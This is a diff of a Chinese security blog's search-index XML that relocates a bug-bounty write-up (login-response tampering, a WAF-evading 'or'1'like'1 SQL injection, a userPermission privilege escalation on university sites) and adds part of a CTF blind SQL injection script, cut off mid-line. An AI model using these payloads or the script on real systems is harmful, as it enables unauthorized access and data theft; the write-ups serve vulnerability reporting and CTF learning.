@@ -197,6 +197,92 @@
 ]]></content>
   </entry>
   <entry>
+    <title>src漏洞挖掘实战</title>
+    <url>/posts/24632/</url>
+    <content><![CDATA[<h2 id="前言"><a class="header-anchor" href="#前言">¶</a>前言</h2>
+<p>好久没更新博客了，消失了快两个礼拜，去尝试摸了一下edusrc。本来打算弄个证书，但好像证书站简单的漏洞都被大师傅们给挖没了，一直出不来洞，QAQ…开篇文章打算慢慢记一下一些有趣的实战（文中所有提到的漏洞已提交给edusrc平台），整个过程需要脱敏，所以马赛克是避免不了的，大家将就看看啦~</p>
+<h2 id="实战"><a class="header-anchor" href="#实战">¶</a>实战</h2>
+<h3 id="登录逻辑漏洞"><a class="header-anchor" href="#登录逻辑漏洞">¶</a>登录逻辑漏洞</h3>
+<p>开始了开始了，逛了逛发现一个后台，尝试弱口令登录，admin/123456一套怼上去<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E7%99%BB%E5%BD%95%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/1.png" alt=""><br>
+坑爹的是发现居然点击登录框没有反应，没有响应对应的请求，右键源码查看一下登录框这里的代码<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E7%99%BB%E5%BD%95%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/2.png" alt=""><br>
+好家伙，居然只是披着一层登录按钮的皮<br>
+<a href="https://imgtu.com/i/6vxGkD"><img src="https://z3.ax1x.com/2021/03/26/6vxGkD.gif" alt="6vxGkD.gif"></a></p>
+<p>继续翻看源码，看见登录处理的逻辑，并且发现逻辑校验登录成功后会跳转到<code>main.php</code><br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E7%99%BB%E5%BD%95%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/3.png" alt=""><br>
+心中一喜，可能有戏，直接url换成<code>main.php</code>访问<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E7%99%BB%E5%BD%95%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/4.png" alt=""><br>
+但进去后，马上弹了一个框又给我踢了出来<br>
+<a href="https://imgtu.com/i/6xSOw6"><img src="https://z3.ax1x.com/2021/03/26/6xSOw6.jpg" alt="6xSOw6.jpg"></a><br>
+我们抓包看看，猜测应该有个文件是校验登录的<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E7%99%BB%E5%BD%95%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/5.png" alt=""><br>
+抓包<code>main.php</code>，放包后，果然看见了一个<code>session.php</code>，这应该是校验登录结果的文件，我们右键抓一个<code>session.php</code>的返回包<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E7%99%BB%E5%BD%95%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/6.png" alt=""><br>
+看见了返回的登录结果，解码一下是刚刚弹的框的文字<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E7%99%BB%E5%BD%95%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/7.png" alt=""><br>
+见证奇迹的时候到了，我们把后面的errMsg给删除，然后把false改成true，这波我单走一个true给你<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E7%99%BB%E5%BD%95%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/8.png" alt=""><br>
+接着我们放包，成功进来了后台<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E7%99%BB%E5%BD%95%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/9.png" alt=""><br>
+<a href="https://imgtu.com/i/6xSAG4"><img src="https://z3.ax1x.com/2021/03/26/6xSAG4.jpg" alt="6xSAG4.jpg"></a></p>
+<p>告辞，水完一篇了~</p>
+<h3 id="随笔"><a class="header-anchor" href="#随笔">¶</a>随笔</h3>
+<p>2021年3月11号开始，笔者第一次接触src漏洞挖掘，下面贴图的是第一个漏洞通过审核收到的邮件<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E9%9A%8F%E7%AC%94/O5P%5BCHZ0M1%24%7D%7D6XZ7R%403LBJ.png" alt=""><br>
+接下来，就是磕磕绊绊的尝试挖掘更多的站点，在4月份4号的时候终于成功拿到了属于自己的证书，完成了自己定的一个月内拿到证书的目标，很开心。<br>
+有证书的学校站点开了这么久，被一个又一个大师傅光顾了这么多次并且提交了大量漏洞，能再找到洞对我来说实属不易，过程坎坎坷坷，但终于还是完成了目标，现在心情好了起来，继续更新嘿嘿！<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%40%5B%60%7BFZQHOQ6EI%5BY95%60AJT%25F.png" alt=""></p>
+<h3 id="可惜的sql注入漏洞"><a class="header-anchor" href="#可惜的sql注入漏洞">¶</a>可惜的sql注入漏洞</h3>
+<p>还是逛逛又到了一个后台，熟悉的一套弱口令打上去，失败了</p>
+<p><a href="https://imgtu.com/i/c8IEmn"><img src="https://z3.ax1x.com/2021/04/07/c8IEmn.gif" alt="c8IEmn.gif"></a></p>
+<p>随手再测一个单引号<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E5%8F%AF%E6%83%9C%E7%9A%84sql%E6%B3%A8%E5%85%A5/2PC%7D%29LWZ2EE5VW72CJ%28%60KFS.png" alt=""><br>
+好兄弟，出奇迹了<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E5%8F%AF%E6%83%9C%E7%9A%84sql%E6%B3%A8%E5%85%A5/U15%7BMVI%5D%5DDQ6C%24_Z%284BIX_0.png" alt=""><br>
+这百分之99.9存在sql注入啊<br>
+<a href="https://imgtu.com/i/c8O5TJ"><img src="https://z3.ax1x.com/2021/04/07/c8O5TJ.gif" alt="c8O5TJ.gif"></a><br>
+嘿嘿，尝试一波万能密码登录<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E5%8F%AF%E6%83%9C%E7%9A%84sql%E6%B3%A8%E5%85%A5/A968%25S4%7DL%7B~0I2X%249T%29P2RM.png" alt=""><br>
+<a href="https://imgtu.com/i/c8X8nU"><img src="https://z3.ax1x.com/2021/04/07/c8X8nU.jpg" alt="c8X8nU.jpg"></a><br>
+有waf，看起来是老版本的D盾，fuzz一下<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E5%8F%AF%E6%83%9C%E7%9A%84sql%E6%B3%A8%E5%85%A5/2S8_O%24V%5DXZFELN7%7DCEFIGRB.png" alt=""><br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E5%8F%AF%E6%83%9C%E7%9A%84sql%E6%B3%A8%E5%85%A5/%5B6%5B4FBGB%28LXA5T8SEF%29%251YH.png" alt=""><br>
+结果是把<code>=</code>和<code>-</code>都给ban了，总结了一下信息</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">网站数据库为sqlserver</span><br><span class="line">fuzz出sql语句应该是</span><br><span class="line">select * from user where user&#x3D;&#39;&#39; and and User_role&#x3D;&#39;管理员&#39; and passwd&#x3D;&#39;&#39;</span><br></pre></td></tr></table></figure>
+<p>在网上找了一些姿势都没利用成功，无奈只好闭合语句尝试fuzz一波密码</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x3D;号被waf拦截的话用like替代</span><br><span class="line">语句也就是&#39;or&#39;1&#39;like&#39;1</span><br><span class="line"></span><br><span class="line">放到sql语句里就是select * from user where user&#x3D;&#39;&#39;or&#39;1&#39;like&#39;1&#39; and and User_role&#x3D;&#39;管理员&#39; and passwd&#x3D;&#39;&#39;</span><br><span class="line"></span><br><span class="line">接着跑密码字典</span><br></pre></td></tr></table></figure>
+<p>没想到，密码123就登录成功了，嘿嘿，看来网站数据库里有用户密码是123<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E5%8F%AF%E6%83%9C%E7%9A%84sql%E6%B3%A8%E5%85%A5/35b9af4c7fc405e94804e34b80cfde62_adc840d6-c7e5-42b6-846d-18212af3e7d2-ITL7TzPR.png" alt=""><br>
+但可惜的是，在审核期间，网站就被学校管理员关站了，导致审核不通过；但总归还是好的，又成功减少了一个网络危害</p>
+<h3 id="随笔2"><a class="header-anchor" href="#随笔2">¶</a>随笔2</h3>
+<p>最近很忙，以至于博客很久也没有来更新，今天省hw结束了，随即打算更新一下文章；思绪从哪里开始讲起呢？从3月份中旬开始学习漏洞挖掘开始吧，一开始其实没有打算先接触src漏洞挖掘，因为觉得自己还需要更多知识来沉淀自己，但为了在4月底的省hw拿个好名次，也就不得不开始去学习一下，好在结果还算满意，最后离结束只剩几个小时的时候用三个0day埋伏了一手，稳稳拿下了省hw高校第一；想起这一个月的学习，还是蛮惊讶的，发现自己在一个月的时间陆陆续续获得了上海交通大学、同济大学、兰州大学、南开大学、东北林业大学、常熟理工、上海外国语等学校颁发的漏洞证书，下面贴几张已经收到的图片吧<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E9%9A%8F%E7%AC%942/IMG_20210414_114939.jpg" alt=""><br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E9%9A%8F%E7%AC%942/qq_pic_merged_1619838122349.jpg" alt=""></p>
+<p><img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E9%9A%8F%E7%AC%942/qq_pic_merged_1619838030290.jpg" alt=""></p>
+<p><img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E9%9A%8F%E7%AC%942/qq_pic_merged_1619837999884.jpg" alt=""></p>
+<p>到底还是最后逼了自己一把，还是那句话，有付出才会有收获；后面估计很长一段时间不会再进行src的漏洞挖掘了，打算把精力转向基础知识的学习</p>
+<h3 id="逻辑漏洞-垂直越权"><a class="header-anchor" href="#逻辑漏洞-垂直越权">¶</a>逻辑漏洞-垂直越权</h3>
+<p>这个洞纯属偶然，在刷手机的时候，无意发现的学校的网址，用电脑访问了之后是一个登录页面<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E-%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83/%60JOP7W%7D%29%5B7%40E_%24U6D0LG~G6.png" alt="">可以注册，注册了一个账号<br>
+账号：3150103968<br>
+密码：12345678<br>
+然后登陆，进去是普通的用户权限<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E-%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83/JQFF554I%5BK%40VMAB1VMC_%60SC.png" alt=""><br>
+然后退出登录，回到登录框这里，用burpsuite抓取登录的数据包<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E-%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83/MFP1%28PB5%7B~%40_J4I5S%25S~SIQ.png" alt=""><br>
+抓取返回包进行观察，发现一个控制用户权限的字段<code>userPermission</code>，这里是user<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E-%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83/%28%24A%29GMXU%25%285%7B667%5B%28ZK%60A4U.png" alt=""><br>
+我们把他改成admin，然后发送数据包<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E-%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83/Z%7BW0ERG%25MS5NJAQZ%24WK%24WBK.png" alt=""><br>
+登录成功后，发现拥有了管理员的权限<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E-%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83/9ATRN%28%247%29R7%7DNS%7DKY7%25MI%7DR.png" alt=""></p>
+]]></content>
+      <tags>
+        <tag>渗透</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>php-md5类型题目汇总</title>
     <url>/posts/16813/</url>
     <content><![CDATA[<h1>前言</h1>
@@ -311,92 +397,6 @@ is_numeric()：   用于检测变量是否为数字或数字字符串</p>
 ]]></content>
       <tags>
         <tag>ctf</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>src漏洞挖掘实战</title>
-    <url>/posts/24632/</url>
-    <content><![CDATA[<h2 id="前言"><a class="header-anchor" href="#前言">¶</a>前言</h2>
-<p>好久没更新博客了，消失了快两个礼拜，去尝试摸了一下edusrc。本来打算弄个证书，但好像证书站简单的漏洞都被大师傅们给挖没了，一直出不来洞，QAQ…开篇文章打算慢慢记一下一些有趣的实战（文中所有提到的漏洞已提交给edusrc平台），整个过程需要脱敏，所以马赛克是避免不了的，大家将就看看啦~</p>
-<h2 id="实战"><a class="header-anchor" href="#实战">¶</a>实战</h2>
-<h3 id="登录逻辑漏洞"><a class="header-anchor" href="#登录逻辑漏洞">¶</a>登录逻辑漏洞</h3>
-<p>开始了开始了，逛了逛发现一个后台，尝试弱口令登录，admin/123456一套怼上去<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E7%99%BB%E5%BD%95%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/1.png" alt=""><br>
-坑爹的是发现居然点击登录框没有反应，没有响应对应的请求，右键源码查看一下登录框这里的代码<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E7%99%BB%E5%BD%95%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/2.png" alt=""><br>
-好家伙，居然只是披着一层登录按钮的皮<br>
-<a href="https://imgtu.com/i/6vxGkD"><img src="https://z3.ax1x.com/2021/03/26/6vxGkD.gif" alt="6vxGkD.gif"></a></p>
-<p>继续翻看源码，看见登录处理的逻辑，并且发现逻辑校验登录成功后会跳转到<code>main.php</code><br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E7%99%BB%E5%BD%95%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/3.png" alt=""><br>
-心中一喜，可能有戏，直接url换成<code>main.php</code>访问<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E7%99%BB%E5%BD%95%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/4.png" alt=""><br>
-但进去后，马上弹了一个框又给我踢了出来<br>
-<a href="https://imgtu.com/i/6xSOw6"><img src="https://z3.ax1x.com/2021/03/26/6xSOw6.jpg" alt="6xSOw6.jpg"></a><br>
-我们抓包看看，猜测应该有个文件是校验登录的<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E7%99%BB%E5%BD%95%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/5.png" alt=""><br>
-抓包<code>main.php</code>，放包后，果然看见了一个<code>session.php</code>，这应该是校验登录结果的文件，我们右键抓一个<code>session.php</code>的返回包<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E7%99%BB%E5%BD%95%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/6.png" alt=""><br>
-看见了返回的登录结果，解码一下是刚刚弹的框的文字<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E7%99%BB%E5%BD%95%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/7.png" alt=""><br>
-见证奇迹的时候到了，我们把后面的errMsg给删除，然后把false改成true，这波我单走一个true给你<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E7%99%BB%E5%BD%95%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/8.png" alt=""><br>
-接着我们放包，成功进来了后台<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E7%99%BB%E5%BD%95%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/9.png" alt=""><br>
-<a href="https://imgtu.com/i/6xSAG4"><img src="https://z3.ax1x.com/2021/03/26/6xSAG4.jpg" alt="6xSAG4.jpg"></a></p>
-<p>告辞，水完一篇了~</p>
-<h3 id="随笔"><a class="header-anchor" href="#随笔">¶</a>随笔</h3>
-<p>2021年3月11号开始，笔者第一次接触src漏洞挖掘，下面贴图的是第一个漏洞通过审核收到的邮件<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E9%9A%8F%E7%AC%94/O5P%5BCHZ0M1%24%7D%7D6XZ7R%403LBJ.png" alt=""><br>
-接下来，就是磕磕绊绊的尝试挖掘更多的站点，在4月份4号的时候终于成功拿到了属于自己的证书，完成了自己定的一个月内拿到证书的目标，很开心。<br>
-有证书的学校站点开了这么久，被一个又一个大师傅光顾了这么多次并且提交了大量漏洞，能再找到洞对我来说实属不易，过程坎坎坷坷，但终于还是完成了目标，现在心情好了起来，继续更新嘿嘿！<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%40%5B%60%7BFZQHOQ6EI%5BY95%60AJT%25F.png" alt=""></p>
-<h3 id="可惜的sql注入漏洞"><a class="header-anchor" href="#可惜的sql注入漏洞">¶</a>可惜的sql注入漏洞</h3>
-<p>还是逛逛又到了一个后台，熟悉的一套弱口令打上去，失败了</p>
-<p><a href="https://imgtu.com/i/c8IEmn"><img src="https://z3.ax1x.com/2021/04/07/c8IEmn.gif" alt="c8IEmn.gif"></a></p>
-<p>随手再测一个单引号<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E5%8F%AF%E6%83%9C%E7%9A%84sql%E6%B3%A8%E5%85%A5/2PC%7D%29LWZ2EE5VW72CJ%28%60KFS.png" alt=""><br>
-好兄弟，出奇迹了<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E5%8F%AF%E6%83%9C%E7%9A%84sql%E6%B3%A8%E5%85%A5/U15%7BMVI%5D%5DDQ6C%24_Z%284BIX_0.png" alt=""><br>
-这百分之99.9存在sql注入啊<br>
-<a href="https://imgtu.com/i/c8O5TJ"><img src="https://z3.ax1x.com/2021/04/07/c8O5TJ.gif" alt="c8O5TJ.gif"></a><br>
-嘿嘿，尝试一波万能密码登录<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E5%8F%AF%E6%83%9C%E7%9A%84sql%E6%B3%A8%E5%85%A5/A968%25S4%7DL%7B~0I2X%249T%29P2RM.png" alt=""><br>
-<a href="https://imgtu.com/i/c8X8nU"><img src="https://z3.ax1x.com/2021/04/07/c8X8nU.jpg" alt="c8X8nU.jpg"></a><br>
-有waf，看起来是老版本的D盾，fuzz一下<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E5%8F%AF%E6%83%9C%E7%9A%84sql%E6%B3%A8%E5%85%A5/2S8_O%24V%5DXZFELN7%7DCEFIGRB.png" alt=""><br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E5%8F%AF%E6%83%9C%E7%9A%84sql%E6%B3%A8%E5%85%A5/%5B6%5B4FBGB%28LXA5T8SEF%29%251YH.png" alt=""><br>
-结果是把<code>=</code>和<code>-</code>都给ban了，总结了一下信息</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">网站数据库为sqlserver</span><br><span class="line">fuzz出sql语句应该是</span><br><span class="line">select * from user where user&#x3D;&#39;&#39; and and User_role&#x3D;&#39;管理员&#39; and passwd&#x3D;&#39;&#39;</span><br></pre></td></tr></table></figure>
-<p>在网上找了一些姿势都没利用成功，无奈只好闭合语句尝试fuzz一波密码</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x3D;号被waf拦截的话用like替代</span><br><span class="line">语句也就是&#39;or&#39;1&#39;like&#39;1</span><br><span class="line"></span><br><span class="line">放到sql语句里就是select * from user where user&#x3D;&#39;&#39;or&#39;1&#39;like&#39;1&#39; and and User_role&#x3D;&#39;管理员&#39; and passwd&#x3D;&#39;&#39;</span><br><span class="line"></span><br><span class="line">接着跑密码字典</span><br></pre></td></tr></table></figure>
-<p>没想到，密码123就登录成功了，嘿嘿，看来网站数据库里有用户密码是123<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E5%8F%AF%E6%83%9C%E7%9A%84sql%E6%B3%A8%E5%85%A5/35b9af4c7fc405e94804e34b80cfde62_adc840d6-c7e5-42b6-846d-18212af3e7d2-ITL7TzPR.png" alt=""><br>
-但可惜的是，在审核期间，网站就被学校管理员关站了，导致审核不通过；但总归还是好的，又成功减少了一个网络危害</p>
-<h3 id="随笔2"><a class="header-anchor" href="#随笔2">¶</a>随笔2</h3>
-<p>最近很忙，以至于博客很久也没有来更新，今天省hw结束了，随即打算更新一下文章；思绪从哪里开始讲起呢？从3月份中旬开始学习漏洞挖掘开始吧，一开始其实没有打算先接触src漏洞挖掘，因为觉得自己还需要更多知识来沉淀自己，但为了在4月底的省hw拿个好名次，也就不得不开始去学习一下，好在结果还算满意，最后离结束只剩几个小时的时候用三个0day埋伏了一手，稳稳拿下了省hw高校第一；想起这一个月的学习，还是蛮惊讶的，发现自己在一个月的时间陆陆续续获得了上海交通大学、同济大学、兰州大学、南开大学、东北林业大学、常熟理工、上海外国语等学校颁发的漏洞证书，下面贴几张已经收到的图片吧<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E9%9A%8F%E7%AC%942/IMG_20210414_114939.jpg" alt=""><br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E9%9A%8F%E7%AC%942/qq_pic_merged_1619838122349.jpg" alt=""></p>
-<p><img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E9%9A%8F%E7%AC%942/qq_pic_merged_1619838030290.jpg" alt=""></p>
-<p><img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E9%9A%8F%E7%AC%942/qq_pic_merged_1619837999884.jpg" alt=""></p>
-<p>到底还是最后逼了自己一把，还是那句话，有付出才会有收获；后面估计很长一段时间不会再进行src的漏洞挖掘了，打算把精力转向基础知识的学习</p>
-<h3 id="逻辑漏洞-垂直越权"><a class="header-anchor" href="#逻辑漏洞-垂直越权">¶</a>逻辑漏洞-垂直越权</h3>
-<p>这个洞纯属偶然，在刷手机的时候，无意发现的学校的网址，用电脑访问了之后是一个登录页面<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E-%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83/%60JOP7W%7D%29%5B7%40E_%24U6D0LG~G6.png" alt="">可以注册，注册了一个账号<br>
-账号：3150103968<br>
-密码：12345678<br>
-然后登陆，进去是普通的用户权限<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E-%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83/JQFF554I%5BK%40VMAB1VMC_%60SC.png" alt=""><br>
-然后退出登录，回到登录框这里，用burpsuite抓取登录的数据包<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E-%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83/MFP1%28PB5%7B~%40_J4I5S%25S~SIQ.png" alt=""><br>
-抓取返回包进行观察，发现一个控制用户权限的字段<code>userPermission</code>，这里是user<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E-%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83/%28%24A%29GMXU%25%285%7B667%5B%28ZK%60A4U.png" alt=""><br>
-我们把他改成admin，然后发送数据包<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E-%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83/Z%7BW0ERG%25MS5NJAQZ%24WK%24WBK.png" alt=""><br>
-登录成功后，发现拥有了管理员的权限<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E-%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83/9ATRN%28%247%29R7%7DNS%7DKY7%25MI%7DR.png" alt=""></p>
-]]></content>
-      <tags>
-        <tag>渗透</tag>
       </tags>
   </entry>
   <entry>
@@ -3750,6 +3750,11 @@ web82写的脚本改改直接用</p>
 <p>这次把ord给ban了，我们使用正则函数去一个个匹配字符，脚本如下</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/6/2 17:03</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://185fcade-247d-4a43-a4fc-5cd023f84184.challenge.ctf.show:8080/api/&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">all_str = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">99</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> all_str:</span><br><span class="line">        payload = <span class="string">&quot;select group_concat(f1ag) from ctfshow_fl0g&quot;</span></span><br><span class="line">        username_data = <span class="string">f&quot;admin&#x27; and if(substr((<span class="subst">&#123;payload&#125;</span>), <span class="subst">&#123;i&#125;</span>, 1)regexp(&#x27;<span class="subst">&#123;j&#125;</span>&#x27;), 1, 0)=1#&quot;</span></span><br><span class="line">        data = &#123;<span class="string">&#x27;username&#x27;</span>: username_data,</span><br><span class="line">                <span class="string">&#x27;password&#x27;</span>: <span class="number">1</span>&#125;</span><br><span class="line">        res = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;密码错误&quot;</span> <span class="keyword">in</span> res.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">            flag += j</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> j == <span 